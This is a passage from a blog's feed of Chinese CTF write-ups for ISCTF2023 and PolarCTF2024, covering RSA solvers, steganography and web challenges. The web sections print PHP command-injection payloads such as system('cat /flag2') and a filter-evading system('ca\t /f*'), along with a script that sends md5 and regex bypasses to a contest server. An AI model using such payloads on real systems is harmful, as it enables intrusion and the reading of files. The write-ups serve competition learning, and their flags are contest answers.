class="keyword">return</span> -<span class="number">1</span></span><br><span class="line">        x, y, d = exgcd(m[<span class="number">0</span>], m[i])</span><br><span class="line">        <span class="keyword">if</span> (a[i] - a[<span class="number">0</span>]) % d != <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> -<span class="number">1</span></span><br><span class="line">        t = m[i] // d</span><br><span class="line">        x = (a[i] - a[<span class="number">0</span>]) // d * x % t</span><br><span class="line">        a[<span class="number">0</span>] = x * m[<span class="number">0</span>] + a[<span class="number">0</span>]</span><br><span class="line">        m[<span class="number">0</span>] = m[<span class="number">0</span>] * m[i] // d</span><br><span class="line">        a[<span class="number">0</span>] = (a[<span class="number">0</span>] % m[<span class="number">0</span>] + m[<span class="number">0</span>]) % m[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">return</span> a[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">p = </span><br><span class="line">q = </span><br><span class="line">r = </span><br><span class="line">dP = </span><br><span class="line">dQ = </span><br><span class="line">dR = </span><br><span class="line">c = </span><br><span class="line">n = p*q*r</span><br><span class="line">phi = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)*(r-<span class="number">1</span>)</span><br><span class="line">a = [dP, dQ, dR]</span><br><span class="line">m = [(q-<span class="number">1</span>)*(r-<span class="number">1</span>), (p-<span class="number">1</span>)*(r-<span class="number">1</span>), (p-<span class="number">1</span>)*(q-<span class="number">1</span>)]</span><br><span class="line">d = exCRT(m, a, <span class="number">3</span>)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(<span class="built_in">pow</span>(c, d, n)))</span><br></pre></td></tr></table></figure><p>很多题都没做，QWQ，逃~</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>ISCTF2023</title>
      <link href="/2024/04/01/ISCTF2023wp/"/>
      <url>/2024/04/01/ISCTF2023wp/</url>
      
        <content type="html"><![CDATA[<h2 id="web-where_is_the_flag"><a class="markdownIt-Anchor" href="#web-where_is_the_flag"></a> Web-where_is_the_flag</h2><p><code>1=system(&quot;ls&quot;);</code><br />发现flag.php index.php<br /><code>flag1: 1=show_source('flag.php');</code><br /><img src="https://img-blog.csdnimg.cn/direct/0a60ca84386e40ccb17b652198cac59a.png" alt="在这里插入图片描述" /></p><p><code>1=system(&quot;ls /&quot;);</code><br />发现flag2<br /><code>flag2: 1=system(&quot;cat /flag2&quot;);</code><br /><code>1=phpinfo();</code><br />找到flag3<br /><code>ISCTF&#123;828b2469-d08d-4c48-930d-dbf5f6cbaeaa&#125;</code></p><h2 id="web-绕进你心里"><a class="markdownIt-Anchor" href="#web-绕进你心里"></a> Web-绕进你心里</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">require</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line"><span class="variable">$str</span> = (String)<span class="variable">$_POST</span>[<span class="string">&#x27;pan_gu&#x27;</span>];</span><br><span class="line"><span class="variable">$num</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;zhurong&#x27;</span>];</span><br><span class="line"><span class="variable">$lida1</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;hongmeng&#x27;</span>];</span><br><span class="line"><span class="variable">$lida2</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;shennong&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$lida1</span> !== <span class="variable">$lida2</span> &amp;&amp; <span class="title function_ invoke__">md5</span>(<span class="variable">$lida1</span>) === <span class="title function_ invoke__">md5</span>(<span class="variable">$lida2</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;md5绕过了!&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[0-9]/&quot;</span>, <span class="variable">$num</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;你干嘛?哎哟!&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">elseif</span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/.+?ISCTF/is&#x27;</span>, <span class="variable">$str</span>))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;再想想!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">stripos</span>(<span class="variable">$str</span>, <span class="string">&#x27;2023ISCTF&#x27;</span>) === <span class="literal">false</span>)&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;就差一点点啦!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">data1 = &#123;</span><br><span class="line">    <span class="string">&#x27;pan_gu&#x27;</span>: <span class="string">&#x27;2023is&#x27;</span>*<span class="number">1000000</span>+<span class="string">&#x27;ctf2023isctf&#x27;</span>  <span class="comment"># 不唯一，重点是1000000绕过前面的preg_match，再检索到2023ISCTF即可</span></span><br><span class="line">&#125;</span><br><span class="line">res = requests.post(<span class="string">&#x27;http://43.249.195.138:21528/?hongmeng[]=21&amp;shennong[]=22&amp;zhurong[]=1&#x27;</span>,</span><br><span class="line">                    data=data1, allow_redirects=<span class="literal">False</span>)</span><br><span class="line"><span class="built_in">print</span>(res.text)</span><br></pre></td></tr></table></figure><p>一开始最后两个直接一起绕过，绕不过去，后来先把正则匹配绕过去，再绕stripos就可以了</p><h2 id="web-wafr"><a class="markdownIt-Anchor" href="#web-wafr"></a> Web-wafr</h2><p>这个新生赛嘛，理解理解<br /><img src="https://img-blog.csdnimg.cn/direct/d7773d27f15c4754b3e0ae3cf21fdef5.png" alt="在这里插入图片描述" /></p><p><code>post:    code=system('ca\t /f*')</code></p><h2 id="crypto-七七的欧拉"><a class="markdownIt-Anchor" href="#crypto-七七的欧拉"></a> Crypto-七七的欧拉</h2><p>yafu分解n失败，然后factor网站不知道为什么用不了，pip下了factordb-pycli才分解到，直接命令执行<code>factordb n</code></p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">e = </span><br><span class="line">n = </span><br><span class="line">c = </span><br><span class="line">p = </span><br><span class="line">d = inverse(e, <span class="built_in">pow</span>(p, <span class="number">8</span>)-<span class="built_in">pow</span>(p, <span class="number">7</span>))</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(<span class="built_in">pow</span>(c, d, n)))</span><br><span class="line"><span class="comment"># ISCTF&#123;3237saq-21se82-3s74f8-8h84ps7-9qw45v7-6bs531-s26h23-c7iu01&#125;</span></span><br></pre></td></tr></table></figure><h2 id="crypto-easy_rsa"><a class="markdownIt-Anchor" href="#crypto-easy_rsa"></a> Crypto-easy_rsa</h2><p>题目给出数据后，如果不做输入的话，会关上连接，还以为是要戳个交互脚本，差点不会，其实flag还是同一个</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">p = </span><br><span class="line">q = </span><br><span class="line">e = </span><br><span class="line">c = </span><br><span class="line">d = inverse(e, (p-<span class="number">1</span>)*(q-<span class="number">1</span>))</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(<span class="built_in">pow</span>(c, d, p*q)))</span><br></pre></td></tr></table></figure><h2 id="crypto-rsa_d"><a class="markdownIt-Anchor" href="#crypto-rsa_d"></a> Crypto-rsa_d</h2><p>这下更简单了，d等着输入呢</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">p = <span class="number">49809223</span></span><br><span class="line">q = <span class="number">43530709</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">d = inverse(e, (p-<span class="number">1</span>)*(q-<span class="number">1</span>))</span><br><span class="line"><span class="built_in">print</span>(d)</span><br></pre></td></tr></table></figure><h2 id="crypto-1zrsa"><a class="markdownIt-Anchor" href="#crypto-1zrsa"></a> Crypto-1zrsa</h2><p>题目</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">genKey</span>(<span class="params">nbits</span>):</span><br><span class="line">    <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">        p1 = getPrime(<span class="number">3</span>*nbits)</span><br><span class="line">        p2 = gmpy2.next_prime(p1)</span><br><span class="line">        q1 = getPrime(nbits)</span><br><span class="line">        q2 = getPrime(nbits)</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">abs</span>((p1 - p2)*q1*q2 / p2) &lt; <span class="number">0.5</span>)</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">abs</span>((p1 - p2)*q1*q2 / p2) &lt; <span class="number">0.5</span>):</span><br><span class="line">            n1 = p1 * q1</span><br><span class="line">            n2 = p2 * q2</span><br><span class="line">            <span class="keyword">return</span> n1,n2</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params">message,e,n</span>):</span><br><span class="line">    m = bytes_to_long(message)</span><br><span class="line">    cipher = <span class="built_in">pow</span>(m,e,n)</span><br><span class="line">    <span class="keyword">return</span> cipher</span><br><span class="line"></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">nbits = <span class="number">512</span></span><br><span class="line">N1,N2 = genKey(nbits)</span><br><span class="line">c = encrypt(flag,e,N1)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;c =&quot;</span>,c)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;N1 =&quot;</span>,N1)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;N2 =&quot;</span>,N2)</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">c = 10514867898770499427284608506159580569755258729683776720082395249877529851029152305989048383470182992945743997295638334301128554841767619528809377736651238576700664675871769469687466885347209033023021132575700436470105289467423655742323143373578268184141573237433927498143740155552829633601489926767185335051352605346248971754473960051955670785777007641909166041398566067524811394639822575661469340152913706417365065683835945980239268665146900957692685590242386540944646586739158427428484471978559453954674292300496568823382513505511940062159025700312492163454304120916055466108498000990408937265075788135466153131436</span></span><br><span class="line"><span class="string">N1 = 29306627985861300819651846356448043523015086509329909246911330574896611830331438353458702041787309531570626136669100576501108581024502570212983369979387658041578384466200573362881060761873478590684611265249166591510948597798713864127744488747451815919677861684787135464097885906630772472111899455047125676738720391327331161464894360886214160668909531050207033060523194208723151015702926842472554933849380343375654696115359960495727909221926251630408376527033291123026893207722440649867394971680316008434251667567174806214522621693042164997381729300075394393372808917061813346794422821819494227772694592990703688149467</span></span><br><span class="line"><span class="string">N2 = 18405525902524887428651801489049128242565457677879715229456940729064725933277139190670749899959483734341103740185991771024797037242681566772189045321838652668819112989587974866361063424698215713773139281840970499871668796770682692589505769008516630604297570518689639885716307469568821629424402742264467677407820449195383921766157185602677665872353099155904715047452319853202981674101731121033360393547940246101864940155160699277417096395998766928213545196492031975135121409309520198853066288180944871441224241681478164494169741263236267316380581883196836731872676312125837497320438964940186318916950049777255612191899</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure><p>一直没什么思路，没有打出来，但题目先放这了</p><h2 id="misc-签到"><a class="markdownIt-Anchor" href="#misc-签到"></a> Misc-签到</h2><p>签完就润</p><h2 id="misc-小猫"><a class="markdownIt-Anchor" href="#misc-小猫"></a> Misc-小猫</h2><p><img src="https://img-blog.csdnimg.cn/direct/6e9dfd026d11430c8fa7b8f52175e075.png" alt="在这里插入图片描述" /></p><p>发现jpg头，JFIF，删除一些不必要信息，得到一张图片<br /><img src="https://img-blog.csdnimg.cn/direct/c038f54c40434addba957e8cb4c348ef.jpeg" alt="在这里插入图片描述" /></p><p>结合小猫上面的坐标，编写脚本：</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">a = [[<span class="string">&#x27;富强&#x27;</span>, <span class="string">&#x27;民主&#x27;</span>, <span class="string">&#x27;文明&#x27;</span>, <span class="string">&#x27;和谐&#x27;</span>],</span><br><span class="line">     [<span class="string">&#x27;自由&#x27;</span>, <span class="string">&#x27;平等&#x27;</span>, <span class="string">&#x27;公正&#x27;</span>, <span class="string">&#x27;法治&#x27;</span>],</span><br><span class="line">     [<span class="string">&#x27;爱国&#x27;</span>, <span class="string">&#x27;敬业&#x27;</span>, <span class="string">&#x27;诚信&#x27;</span>, <span class="string">&#x27;友善&#x27;</span>]]</span><br><span class="line">b = [[<span class="string">&#x27;爱国&#x27;</span>, <span class="string">&#x27;自由&#x27;</span>, <span class="string">&#x27;富强&#x27;</span>],</span><br><span class="line">     [<span class="string">&#x27;敬业&#x27;</span>, <span class="string">&#x27;平等&#x27;</span>, <span class="string">&#x27;民主&#x27;</span>],</span><br><span class="line">     [<span class="string">&#x27;诚信&#x27;</span>, <span class="string">&#x27;公正&#x27;</span>, <span class="string">&#x27;文明&#x27;</span>],</span><br><span class="line">     [<span class="string">&#x27;友善&#x27;</span>, <span class="string">&#x27;法治&#x27;</span>, <span class="string">&#x27;和谐&#x27;</span>]]</span><br><span class="line">c = [[<span class="string">&#x27;富强&#x27;</span>, <span class="string">&#x27;自由&#x27;</span>, <span class="string">&#x27;爱国&#x27;</span>],</span><br><span class="line">     [<span class="string">&#x27;民主&#x27;</span>, <span class="string">&#x27;平等&#x27;</span>, <span class="string">&#x27;敬业&#x27;</span>],</span><br><span class="line">     [<span class="string">&#x27;文明&#x27;</span>, <span class="string">&#x27;公正&#x27;</span>, <span class="string">&#x27;诚信&#x27;</span>],</span><br><span class="line">     [<span class="string">&#x27;和谐&#x27;</span>, <span class="string">&#x27;法治&#x27;</span>, <span class="string">&#x27;友善&#x27;</span>]]</span><br><span class="line">numlist = <span class="string">&#x27;32323233313221324242332132213241322141214123412232323212414132124111323241314141412341314122411241133212411141314123414241324142321232313232414241324132424342&#x27;</span></span><br><span class="line">j = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> j &lt;= <span class="built_in">len</span>(numlist)-<span class="number">2</span>:</span><br><span class="line">    <span class="built_in">print</span>(c[<span class="built_in">int</span>(numlist[j])-<span class="number">1</span>][<span class="built_in">int</span>(numlist[j+<span class="number">1</span>])-<span class="number">1</span>], end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    j += <span class="number">2</span></span><br><span class="line"><span class="comment"># 公正公正公正诚信文明公正民主公正法治法治诚信民主公正民主公正和谐公正民主和谐民主和谐敬业和谐平等公正公正公正自由和谐和谐公正自由和谐富强公正公正和谐文明和谐和谐和谐敬业和谐文明和谐平等和谐自由和谐爱国公正自由和谐富强和谐文明和谐敬业和谐法治和谐公正和谐法治公正自由公正文明公正公正和谐法治和谐公正和谐公正法治友善法治</span></span><br><span class="line"><span class="comment"># flag&#123;aca195fd3d0f2392548d029767dbf766&#125;</span></span><br></pre></td></tr></table></figure><p>好好好，一开始b是有问题的，c是正确的，需要把b反转一下，确实这道题有点开脑洞了</p><h2 id="misc-easy_zip"><a class="markdownIt-Anchor" href="#misc-easy_zip"></a> Misc-easy_zip</h2><p>确实送分，直接破，密码：399525<br />ISCTF{9b28de4e-0abb-4d6f-9b8f-4e4ee1732b09}</p><h2 id="misc-杰伦可是流量明星"><a class="markdownIt-Anchor" href="#misc-杰伦可是流量明星"></a> Misc-杰伦可是流量明星</h2><p>binwalk 进行分离，《不能说的密码》没有啥信息，分析流量包<br /><img src="https://img-blog.csdnimg.cn/direct/e438b697d4ee4ebca32d4eec6784b83e.png" alt="在这里插入图片描述" /></p><p>在url编码中，%7B %7D正是{},ISCTF{wddhr836459_83}<br />(直接记事本打开也可以！！)</p><h2 id="misc-蓝鲨的福利"><a class="markdownIt-Anchor" href="#misc-蓝鲨的福利"></a> Misc-蓝鲨的福利</h2><p>010打开，0D 0A 1A 0A,格式丢失，缺少png文件头，89 50 4E 47<br />发现flag,ISCTF{blueshark_welcome_you}</p><h2 id="misc-镜流"><a class="markdownIt-Anchor" href="#misc-镜流"></a> Misc-镜流</h2><p><img src="https://img-blog.csdnimg.cn/direct/961b4b6ea47c473985faec3139960f11.png" alt="在这里插入图片描述" /></p><p>很明显，像素点提取，缩小10倍</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"></span><br><span class="line">img = Image.<span class="built_in">open</span>(<span class="string">&quot;C:\\Users\\27920\\Desktop\\1new.png&quot;</span>)</span><br><span class="line">w = img.width</span><br><span class="line">h = img.height</span><br><span class="line">img_obj = Image.new(<span class="string">&quot;RGB&quot;</span>, (w//<span class="number">10</span>, h//<span class="number">10</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(w//<span class="number">10</span>):</span><br><span class="line">    <span class="keyword">for</span> y <span class="keyword">in</span> <span class="built_in">range</span>(h//<span class="number">10</span>):</span><br><span class="line">        rgb = img.getpixel((x*<span class="number">10</span>, y*<span class="number">10</span>))</span><br><span class="line">        img_obj.putpixel((x, y), rgb)</span><br><span class="line">img_obj.save(<span class="string">&quot;C:\\Users\\27920\\Desktop\\jliu.png&quot;</span>)</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/direct/cc6e47b36a324a829801e5da6ba3da07.png" alt="在这里插入图片描述" /></p><p>lsb隐写，(0,0,0)</p><p><img src="https://img-blog.csdnimg.cn/direct/b47c6d9eb82c4d24874e46f992af2731.png" alt="在这里插入图片描述" /></p><h2 id="misc-ez_misc"><a class="markdownIt-Anchor" href="#misc-ez_misc"></a> Misc-Ez_misc</h2><p>打开ppt，没有发现关键信息<br />记事本打开，搜索key，发现可疑字符串M13c_!ps2s23<br />得到一张jpg图片，010打开末尾为fake-flag，补上文件头FF D8 FF E0<br /><img src="https://img-blog.csdnimg.cn/direct/70be6c21d2de46e8be3c83596442568e.jpeg" alt="在这里插入图片描述" /></p><p>扫码得到<br />flag{5e093f8a-6b8c-4fa5-b9f7-0ae3b6b0da56}</p><h2 id="misc-png的基本食用"><a class="markdownIt-Anchor" href="#misc-png的基本食用"></a> Misc-PNG的基本食用</h2><p>part1，总感觉宽高有点不太对劲，拖入虚拟机，无法显示，直接crc值爆破宽高<code>ISCTF&#123;png-is-</code><br />part2，lsb隐写，rgb(0,0,0),在头部发现<code>so-ez-</code><br />part3，文件分离，010打开，可以在尾部发现7z头，复制新建，得到7z文件，<code>for-you&#125;</code><br /><strong>ISCTF{png-is-so-ez-for-you}</strong></p><h2 id="misc-mcsog-猫猫"><a class="markdownIt-Anchor" href="#misc-mcsog-猫猫"></a> Misc-MCSOG-猫猫</h2><p>猫猫回复中并没有看见flag，应该隐写了<br />花了50分，vim查看，看见有&lt;200c&gt;&lt;200e&gt;&lt;202e&gt;三种零宽度字符，网上看到了一道例题，照着打<br />找个在线网站<br /><img src="https://img-blog.csdnimg.cn/direct/1472c35f4f6940f9bbf6714617987475.png" alt="在这里插入图片描述" /></p><p><strong>ISCTF{[o]F0oO.LliI_Bu_D4Ng_r3N}</strong></p><h2 id="pwn-test_nc"><a class="markdownIt-Anchor" href="#pwn-test_nc"></a> Pwn-test_nc</h2><p>Linux下，nc ip port</p><h2 id="pwn-nc_shell"><a class="markdownIt-Anchor" href="#pwn-nc_shell"></a> Pwn-nc_shell</h2><p>Linux下，nc ip port -&gt;ls-&gt;cat flag(两道签到pwn)</p><h2 id="reserve-crack_me"><a class="markdownIt-Anchor" href="#reserve-crack_me"></a> Reserve-crack_me</h2><p>丢进IDA，什么都没找到，鉴于是re的签到题，拖入小黑窗<br />ISCTF{873c-298c-2948-23bh-291h-kt30}</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>PolarCTF2024春季个人挑战赛wp</title>
      <link href="/2024/03/23/PolarCTF2024%E6%98%A5%E5%AD%A3%E4%B8%AA%E4%BA%BA%E6%8C%91%E6%88%98%E8%B5%9Bwp/"/>
      <url>/2024/03/23/PolarCTF2024%E6%98%A5%E5%AD%A3%E4%B8%AA%E4%BA%BA%E6%8C%91%E6%88%98%E8%B5%9Bwp/</url>
      
        <content type="html"><![CDATA[<h1 id="crypto周杰伦的贝斯"><a class="markdownIt-Anchor" href="#crypto周杰伦的贝斯"></a> 【CRYPTO】周杰伦的贝斯</h1><p>题目<code>👊👢👧👉👎🐽👅👁👈🐧👉👆👈👣👟👐👊👱🐧🐰👇👈🐴🐴</code><br />其实就对应附件的名字<code>100_64_32</code><br />base100(或者说是Emoji表情符号)-&gt;base64-&gt;base32<br />得到<code>Jay Chou</code><br />flag:<br /><code>flag&#123;Jay Chou&#125;</code></p><h1 id="cryptorsaaa"><a class="markdownIt-Anchor" href="#cryptorsaaa"></a> 【CRYPTO】rsaaa</h1><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">p = <span class="number">9648423029010515676590551740010426534945737639235739800643989352039852507298491399561035009163427050370107570733633350911691280297777160200625281665378483</span></span><br><span class="line">q = <span class="number">11874843837980297032092405848653656852760910154543380907650040190704283358909208578251063047732443992230647903887510065547947313543299303261986053486569407</span></span><br><span class="line">c = <span class="number">75036747635306642448951304206998877676661823155273906467327033126738852180428655042280881978878498990667216678397370196258985509664476355705024803037163192947063192452198182809379575421727717664980771937882048579654137560876937198021458204902826397562775388222716165902130775042367930795903054668968295345506</span></span><br><span class="line">n = p*q</span><br><span class="line">d = inverse(e, (p-<span class="number">1</span>)*(q-<span class="number">1</span>))</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(<span class="built_in">pow</span>(c, d, n)))</span><br><span class="line"><span class="comment"># b&#x27;    welcome to polar&#x27;</span></span><br></pre></td></tr></table></figure><p>flag:<br /><code>flag&#123;welcome to polar&#125;</code></p><h1 id="crypto阴阳怪气的杰斐逊"><a class="markdownIt-Anchor" href="#crypto阴阳怪气的杰斐逊"></a> 【CRYPTO】阴阳怪气的杰斐逊</h1><p>转轮密码解密<br />Word文档里面什么都没有，但是里面肯定藏东西了，binwalk一下，在document.xml里面发现了阴阳怪气编码</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">就 这 ¿ 就 这 ¿ 就 这 ¿ 不 会 吧 ？ 不 会 吧 ？ 不 会 吧 ？ 就 这 ¿ 就 这 ¿ 就 这 ¿ 就 这 ¿ 就 这 ¿ 就 这 ¿ 不 会 吧 ？ 不 会 吧 ？ 不 会 吧 ？ 就 这 ¿ 就 这 ¿ 就 这 ¿ 就 这 ¿ 就 这 ¿ 就 这 ¿ 不 会 吧 ？ 不 会 吧 ？ 就 这 ¿ 不 会 吧 ？ 就 这 ¿ 就 这 ¿ 就 这 ¿ 就 这 ¿ 就 这 ¿ 不 会 吧 ？ 不 会 吧 ？ 就 这 ¿ 就 这 ¿ 不 会 吧 ？ 就 这 ¿ 就 这 ¿ 就 这 ¿ 就 这 ¿ 不 会 吧 ？ 不 会 吧 ？ 就 这 ¿ 就 这 ¿ 就 这 ¿ 不 会 吧 ？ 就 这 ¿ 就 这 ¿ 就 这 ¿ 不 会 吧 ？ 不 会 吧 ？ 就 这 ¿ 就 这 ¿ 就 这 ¿ 就 这 ¿ 就 这 ¿ 就 这 ¿ 就 这 ¿ 不 会 吧 ？ 不 会 吧 ？ 就 这 ¿ 不 会 吧 ？ 就 这 ¿ 就 这 ¿ 就 这 ¿ 就 这 ¿ 就 这 ¿ 不 会 吧 ？ 不 会 吧 ？ 不 会 吧 ？ 就 这 ¿ 就 这 ¿ 就 这 ¿ 就 这 ¿ 就 这 ¿ 就 这 ¿ 不 会 吧 ？ 不 会 吧 ？ 就 这 ¿ 就 这 ¿ 就 这 ¿ 就 这 ¿ 就 这 ¿ 就 这 ¿ 就 这 ¿ 不 会 吧 ？ 不 会 吧 ？ 就 这 ¿ 不 会 吧 ？ 就 这 ¿ 就 这 ¿ 就 这 ¿ 就 这 ¿ 就 这 ¿ 不 会 吧 ？ 不 会 吧 ？ 就 这 ¿ 就 这 ¿ 就 这 ¿ 就 这 ¿ 就 这 ¿ 就 这 ¿ 就 这 ¿ 不 会 吧 ？ 不 会 吧 ？ 就 这 ¿ 就 这 ¿ 就 这 ¿ 不 会 吧 ？ 就 这 ¿ 就 这 ¿ 就 这 ¿ 不 会 吧 ？ 不 会 吧 ？ 就 这 ¿ 不 会 吧 ？ 就 这 ¿ 就 这 ¿ 就 这 ¿ 就 这 ¿ 就 这 ¿ 不 会 吧 ？ 不 会 吧 ？ 就 这 ¿ 就 这 ¿ 不 会 吧 ？ 就 这 ¿ 就 这 ¿ 就 这 ¿ 就 这 ¿ 不 会 吧 ？ 不 会 吧 ？ 就 这 ¿ 就 这 ¿ 不 会 吧 ？ 就 这 ¿ 就 这 ¿ 就 这 ¿ 就 这 ¿ 不 会 吧 ？ 不 会 吧 ？ 就 这 ¿ 不 会 吧 ？ 就 这 ¿ 就 这 ¿ 就 这 ¿ 就 这 ¿ 就 这 ¿ 不 会 吧 ？ 不 会 吧 ？ 就 这 ¿ 就 这 ¿ 不 会 吧 ？ 就 这 ¿ 就 这 ¿ 就 这 ¿ 就 这 ¿ 不 会 吧 ？ 不 会 吧 ？ 就 这 ¿ 就 这 ¿ 就 这 ¿ 就 这 ¿ 就 这 ¿ 就 这 ¿ 就 这 ¿ 不 会 吧 ？ 不 会 吧 ？ 就 这 ¿ 就 这 ¿ 就 这 ¿ 不 会 吧 ？ 就 这 ¿ 就 这 ¿ 就 这 ¿ 不 会 吧 ？ 不 会 吧 ？ 就 这 ¿ 就 这 ¿ 不 会 吧 ？ 就 这 ¿ 就 这 ¿ 就 这 ¿ 就 这 ¿ 不 会 吧 ？ 不 会 吧 ？ 就 这 ¿ 就 这 ¿ 不 会 吧 ？ 就 这 ¿ 就 这 ¿ 就 这 ¿ 就 这 ¿ 不 会 吧 ？ 不 会 吧 ？ 就 这 ¿ 就 这 ¿ 就 这 ¿ 不 会 吧 ？ 就 这 ¿ 就 这 ¿ 就 这 ¿ 不 会 吧 ？ 不 会 吧 ？ 就 这 ¿ 就 这 ¿ 就 这 ¿ 就 这 ¿ 就 这 ¿ 就 这 ¿ 就 这 ¿ 不 会 吧 ？ 不 会 吧 ？ 就 这 ¿ 就 这 ¿ 就 这 ¿ 不 会 吧 ？ 就 这 ¿ 就 这 ¿ 就 这 ¿ 不 会 吧 ？ 不 会 吧 ？ 就 这 ¿ 不 会 吧 ？ 就 这 ¿ 就 这 ¿ 就 这 ¿ 就 这 ¿ 就 这 ¿ 不 会 吧 ？ 不 会 吧 ？ 就 这 ¿ 就 这 ¿ 就 这 ¿ 就 这 ¿ 就 这 ¿ 就 这 ¿ 就 这 ¿ 不 会 吧 ？ 不 会 吧 ？ 不 会 吧 ？ 就 这 ¿ 就 这 ¿ 就 这 ¿ 就 这 ¿ 就 这 ¿ 就 这 ¿ 不 会 吧 ？ 不 会 吧 ？ 不 会 吧 ？ 就 这 ¿ 就 这 ¿ 就 这 ¿ 就 这 ¿ 就 这 ¿ 就 这 ¿ 不 会 吧 ？ 不 会 吧 ？ 就 这 ¿ 就 这 ¿ 就 这 ¿ 不 会 吧 ？ 就 这 ¿ 就 这 ¿ 就 这 ¿ 不 会 吧 ？ 不 会 吧 ？ 就 这 ¿ 就 这 ¿ 就 这 ¿ 就 这 ¿ 就 这 ¿ 就 这 ¿ 就 这 ¿ 不 会 吧 ？ 不 会 吧 ？ 不 会 吧 ？ 就 这 ¿ 就 这 ¿ 就 这 ¿ 就 这 ¿ 就 这 ¿ 就 这 ¿ 不 会 吧 ？ 不 会 吧 ？ 不 会 吧 ？ 就 这 ¿ 就 这 ¿ 就 这 ¿ 就 这 ¿ 就 这 ¿ 就 这 ¿ 不 会 吧 ？ 不 会 吧 ？ 就 这 ¿ 不 会 吧 ？ 就 这 ¿ 就 这 ¿ 就 这 ¿ 就 这 ¿ 就 这 ¿ 不 会 吧 ？ 不 会 吧 ？ 就 这 ¿ 就 这 ¿ 不 会 吧 ？ 就 这 ¿ 就 这 ¿ 就 这 ¿ 就 这 ¿ 不 会 吧 ？ 不 会 吧 ？ 就 这 ¿ 就 这 ¿ 就 这 ¿ 不 会 吧 ？ 就 这 ¿ 就 这 ¿ 就 这 ¿ 不 会 吧 ？ 不 会 吧 ？ 就 这 ¿ 就 这 ¿ 就 这 ¿ 就 这 ¿ 就 这 ¿ 就 这 ¿ 就 这 ¿ 不 会 吧 ？ 不 会 吧 ？ 就 这 ¿ 就 这 ¿ 就 这 ¿ 不 会 吧 ？ 就 这 ¿ 就 这 ¿ 就 这 ¿ 不 会 吧 ？ 不 会 吧 ？ 就 这 ¿ 就 这 ¿ 就 这 ¿ 就 这 ¿ 就 这 ¿ 就 这 ¿ 就 这 ¿ 不 会 吧 ？ 不 会 吧 ？ 不 会 吧 ？ 就 这 ¿ 就 这 ¿ 就 这 ¿ 就 这 